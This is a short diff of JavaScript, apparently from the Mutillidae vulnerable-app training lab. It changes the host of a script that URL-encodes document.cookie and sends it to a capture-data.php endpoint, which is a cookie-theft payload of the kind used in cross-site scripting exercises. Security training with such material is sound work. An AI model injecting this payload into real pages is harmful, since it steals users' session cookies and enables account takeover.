@@ -2,7 +2,7 @@
 	var lXMLHTTP;
 	try{ 
 		var lData = "data=" + encodeURIComponent(document.cookie);
-		var lHost = "mutillidae.local";
+		var lHost = "mutillidae.localhost";
 		var lProtocol = "http";
 		var lFilePath = "/capture-data.php";
 		var lAction = lProtocol + "://" + lHost + lFilePath;
